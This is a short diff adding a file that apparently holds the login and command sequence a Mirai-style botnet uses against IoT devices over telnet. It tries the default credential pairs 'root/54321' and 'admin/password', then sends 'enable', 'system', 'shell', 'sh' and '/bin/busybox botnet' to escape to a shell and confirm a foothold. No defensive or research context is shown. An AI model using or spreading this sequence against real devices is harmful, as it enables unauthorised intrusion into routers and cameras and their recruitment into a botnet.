@@ -1,0 +1,16 @@
+root
+
+54321
+enable
+system
+shell
+sh
+/bin/busybox botnet
+admin
+
+password
+enable
+system
+shell
+sh
+/bin/busybox botnet
